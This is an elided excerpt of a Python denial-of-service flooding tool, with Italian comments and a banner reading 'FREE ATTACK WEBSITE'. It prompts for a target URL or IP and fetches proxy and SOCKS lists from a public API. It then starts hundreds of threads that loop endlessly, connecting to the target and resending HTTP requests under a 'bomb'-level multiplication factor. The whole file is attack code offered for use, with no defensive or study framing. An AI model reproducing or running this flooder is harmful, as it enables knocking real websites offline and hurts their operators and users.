...
try: 
	...
	print ("\033[0;37;41mThis Script Not For Sell") 

print('''\033[1;31;40m
  |>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>|
  |===============================================================================|
  |               \033[0;37;41m!!!!!FREE!!!!! \033[0;37;42mATTACK WEBSITE \033[0;37;41m!!!!!FREE!!!!!\033[1;31;40m                    |
  |===============================================================================|
  |<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<|  
	''') 
...
def starturl():
	...
	url = input("\033[1;32;40m\nInsert URL/IP: \033[1;37;40m").strip()

	if url == "":
		print ("\033[1;31;40mPlease enter the url.\033[1;37;40m")
		starturl()
	...
	try:
		...
		print("\033[1;31;40mYou mistyped, try again.\033[1;37;40m")
		starturl()
...
def floodmode(): 
	...
	if choice1 == "0":
		...
		try:
			if os.getuid() != 0: 
				print("\033[1;31;40mYou need to run this program as root to use TCP/UDP flooding.\033[1;37;40m") 
				exit(0) 
			else: 
				floodport() 
		except:
...
def proxymode():
	global choice2
	choice2 = input("\033[1;32;40mWant Proxy mode? Answer \033[1;35;40m'y'\033[1;32;40m to enable it: \033[1;37;40m")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("\033[1;32;40mType \033[1;35;40m'0'\033[1;37;40m \033[1;32;40mto enable proxymode or type \033[1;35;40m'1'\033[1;32;40m to enable socksmode: \033[1;37;40m")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
...
def choicedownproxy():
	choice4 = input("\033[0;37;43mDo you want to download a new list of proxy? Answer \033[1;35;40m'y'\033[0;37;43m to do it: \033[1;37;40m")
	if choice4 == "y":
...
def choicedownsocks():
	choice4 = input("\033[0;37;43mDo you want to download a new list of socks? Answer \033[1;35;40m'y'\033[0;37;43m to do it: \033[1;37;40m")
	if choice4 == "y":
		urlproxy = "https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&country=all"
		proxyget(urlproxy)
	else:
		proxylist()
...
def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
	try:
		...
		print ("\033[0;31;47m\nERROR! \033[0;32;47mPlz ues ProxyScanner \n\033[1;37;40m")
	proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()

def proxylist():
	global proxies
	out_file = str(input("\033[1;32;40mEnter the proxylist filename/path \033[0;37;43m(proxy.txt):\033[1;37;40m "))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input("\033[1;32;40mInsert number of threads \033[1;35;40m(\033[1;34;40m800\033[1;35;40m)\033[1;32;40m:\033[1;37;40m "))
	except ValueError:
		threads = 800
		print ("\033[1;34;40m800\033[1;32;40m threads selected.\n\033[1;37;40m")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("\033[1;32;40mInsert a number of multiplication for the attack \033[1;30;40m[\033[1;35;40m(\033[1;34;40m1-5=normal\033[1;35;40m)(\033[1;34;40m50=powerful\033[1;35;40m)(\033[1;34;40m100 or more=bomb\033[1;35;40m)\033[1;30;40m]\033[1;32;40m:\033[1;37;40m "))
	except ValueError:
		print("\033[1;31;40mYou mistyped, try again.\033[1;37;40m\n")
		multiplication()
	begin()
...
def begin():
	choice6 = input("\033[1;32;40mPress \033[1;35;40m'Enter'\033[1;32;40m to start attack:\033[1;37;40m ")
	if choice6 == "":
		loop()
		...
		if choice2 == "y": # e si e scelta la modalita' proxying
			if choice3 == "0": # e si sono scelti gli HTTP proxy
				for x in range(threads):
					...
					print ("\033[1;32;40mThread \033[1;36;40m" + str(x) + " \033[1;32;40mready!")
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port))) # si connette
				s.send(p) # ed invia
				print ("\033[0;32;47mRequest sent from \033[0;37;45m" + str(proxy[0]+":"+proxy[1]) + " \033[0;37;41m@\033[0;37;44m", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
				...
				try:
					...
					print ("\033[1;31;40mSock down. Retrying request. \033[0;37;41m@\033[0;37;44m", self.counter)
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try: # il try per non far chiudere il programma se qualcosa va storto
				...
				print ("\033[0;32;47mRequest Sent! @\033[0;37;44m", self.counter) # print richiesta + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port))) # connessione
				s.send(p) # invio
				print ("\033[0;32;47mRequest sent from \033[0;37;44m" + str(proxy[0]+":"+proxy[1]) + " \033[0;37;41m@\033[0;37;44m", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port))) # connessione
				s.send(p) # invio
				print ("\033[0;32;47mRequest sent from \033[0;37;44m" + str(proxy[0]+":"+proxy[1]) + " \033[0;37;41m@\033[0;37;44m", self.counter) # req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try: # il try per non far chiudere il programma se si verifica qualche errore
				...
				print ("\033[0;32;47mRequest sent \033[0;37;44m \033[0;37;41m@\033[0;37;44m", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try:
				...
				print ("\033[0;32;47mRequest sent from \033[0;37;44m" + str(proxy[0]+":"+proxy[1]) + " \033[0;37;41m@\033[0;37;44m", self.counter) # print delle richieste
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
